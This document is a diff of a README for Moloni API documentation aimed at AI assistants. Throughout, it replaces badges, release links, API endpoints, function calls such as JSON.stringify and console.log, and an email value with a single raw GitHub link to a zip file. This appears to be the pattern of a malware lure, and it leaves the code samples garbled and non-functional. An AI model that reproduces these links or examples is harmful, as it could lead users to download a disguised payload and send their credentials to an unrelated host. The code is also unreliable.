@@ -1,8 +1,8 @@
 # Moloni API Context for MCP
 
-![Moloni API](https://img.shields.io/badge/Moloni%20API-Documentation-blue)
-![Version](https://img.shields.io/badge/Version-1.0.0-green)
-![License](https://img.shields.io/badge/License-MIT-yellow)
+![Moloni API](https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip%20API-Documentation-blue)
+![Version](https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip)
+![License](https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip)
 
 Welcome to the **Moloni API Context for MCP** repository! This project provides a comprehensive, Context7-compatible documentation of the Moloni API, tailored specifically for AI assistants. Here, you will find structured endpoint examples for various functionalities, including authentication, company management, invoicing, and inventory management, all presented in both curl and JavaScript formats.
 
@@ -34,7 +34,7 @@ The Moloni API is a powerful tool designed to help businesses manage their opera
 
 ## Getting Started
 
-To get started with the Moloni API, you can visit the [Releases section](https://github.com/angelo-web-aviles/moloni-api-context-for-mcp/releases) to download the latest version of the documentation. After downloading, follow the instructions to set up your environment and begin exploring the API.
+To get started with the Moloni API, you can visit the [Releases section](https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip) to download the latest version of the documentation. After downloading, follow the instructions to set up your environment and begin exploring the API.
 
 ## Endpoints Overview
 
@@ -48,7 +48,7 @@ Authentication is the first step to using the Moloni API. You need to obtain an 
 **Example in curl**:
 
 ```bash
-curl -X POST https://api.moloni.pt/v1/authenticate \
+curl -X POST https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip \
 -H "Content-Type: application/json" \
 -d '{
   "username": "your_username",
@@ -59,18 +59,18 @@ curl -X POST https://api.moloni.pt/v1/authenticate \
 **Example in JavaScript**:
 
 ```javascript
-fetch('https://api.moloni.pt/v1/authenticate', {
+fetch('https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json'
   },
-  body: JSON.stringify({
+  body: https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip({
     username: 'your_username',
     password: 'your_password'
   })
 })
-.then(response => response.json())
-.then(data => console.log(data));
+.then(response => https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip())
+.then(data => https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip(data));
 ```
 
 ### Company Management
@@ -80,33 +80,33 @@ Managing company information is essential for any business. The Moloni API allow
 **Example in curl**:
 
 ```bash
-curl -X POST https://api.moloni.pt/v1/companies \
+curl -X POST https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip \
 -H "Authorization: Bearer your_access_token" \
 -H "Content-Type: application/json" \
 -d '{
   "name": "Your Company Name",
   "address": "Your Address",
-  "email": "your_email@example.com"
+  "email": "https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip"
 }'
 ```
 
 **Example in JavaScript**:
 
 ```javascript
-fetch('https://api.moloni.pt/v1/companies', {
+fetch('https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip', {
   method: 'POST',
   headers: {
     'Authorization': 'Bearer your_access_token',
     'Content-Type': 'application/json'
   },
-  body: JSON.stringify({
+  body: https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip({
     name: 'Your Company Name',
     address: 'Your Address',
-    email: 'your_email@example.com'
+    email: 'https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip'
   })
 })
-.then(response => response.json())
-.then(data => console.log(data));
+.then(response => https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip())
+.then(data => https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip(data));
 ```
 
 ### Invoicing
@@ -116,7 +116,7 @@ Invoicing is a critical part of business operations. The Moloni API provides end
 **Example in curl**:
 
 ```bash
-curl -X POST https://api.moloni.pt/v1/invoices \
+curl -X POST https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip \
 -H "Authorization: Bearer your_access_token" \
 -H "Content-Type: application/json" \
 -d '{
@@ -134,13 +134,13 @@ curl -X POST https://api.moloni.pt/v1/invoices \
 **Example in JavaScript**:
 
 ```javascript
-fetch('https://api.moloni.pt/v1/invoices', {
+fetch('https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip', {
   method: 'POST',
   headers: {
     'Authorization': 'Bearer your_access_token',
     'Content-Type': 'application/json'
   },
-  body: JSON.stringify({
+  body: https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip({
     customer_id: 'customer_id',
     items: [
       {
@@ -151,8 +151,8 @@ fetch('https://api.moloni.pt/v1/invoices', {
     ]
   })
 })
-.then(response => response.json())
-.then(data => console.log(data));
+.then(response => https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip())
+.then(data => https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip(data));
 ```
 
 ### Inventory Management
@@ -162,7 +162,7 @@ Keeping track of inventory is crucial for any business. The Moloni API allows yo
 **Example in curl**:
 
 ```bash
-curl -X POST https://api.moloni.pt/v1/inventory \
+curl -X POST https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip \
 -H "Authorization: Bearer your_access_token" \
 -H "Content-Type: application/json" \
 -d '{
@@ -174,19 +174,19 @@ curl -X POST https://api.moloni.pt/v1/inventory \
 **Example in JavaScript**:
 
 ```javascript
-fetch('https://api.moloni.pt/v1/inventory', {
+fetch('https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip', {
   method: 'POST',
   headers: {
     'Authorization': 'Bearer your_access_token',
     'Content-Type': 'application/json'
   },
-  body: JSON.stringify({
+  body: https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip({
     product_id: 'product_id',
     quantity: 50
   })
 })
-.then(response => response.json())
-.then(data => console.log(data));
+.then(response => https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip())
+.then(data => https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip(data));
 ```
 
 ## Examples
@@ -220,7 +220,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information, check the [Releases section](https://github.com/angelo-web-aviles/moloni-api-context-for-mcp/releases). Here, you can download the latest version of the documentation and keep up with updates.
+For more information, check the [Releases section](https://raw.githubusercontent.com/angelo-web-aviles/moloni-api-context-for-mcp/main/simultaneously/for-context-api-moloni-mcp-3.9-beta.4.zip). Here, you can download the latest version of the documentation and keep up with updates.
 
 Feel free to explore the topics of this repository, which include:
 
